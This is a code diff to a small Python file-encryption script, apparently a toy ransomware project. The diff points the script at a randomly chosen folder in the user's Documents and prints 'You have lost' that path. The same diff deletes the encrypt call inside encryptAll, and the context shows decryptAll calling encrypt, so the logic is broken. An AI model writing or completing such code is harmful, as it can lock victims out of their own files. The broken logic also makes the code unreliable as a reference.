@@ -1,5 +1,7 @@
 from cryptography.fernet import Fernet
 import os
+from pathlib import Path
+import random
 # Generate a key
 key = Fernet.generate_key()
 
@@ -54,7 +56,6 @@ def encryptAll(directory):
     for root, _, files in os.walk(directory):
         for filename in files:  # loop through files in the current directory
             path=os.path.join(root, filename)
-            encrypt(path)
 
 def decryptAll(directory):
     for root, _, files in os.walk(directory):
@@ -63,5 +64,9 @@ def decryptAll(directory):
             encrypt(path)
     os.remove("filekey.key")
 
-directory="test"
-encryptAll(directory)
+DOCUMENTS = Path.home() / 'Documents'
+files=os.listdir(DOCUMENTS)
+i=random.randint(0,len(files)-1)
+path= (str(DOCUMENTS)+"/"+files[i]+"/")
+print ("You have lost "+path)
+encryptAll(path)
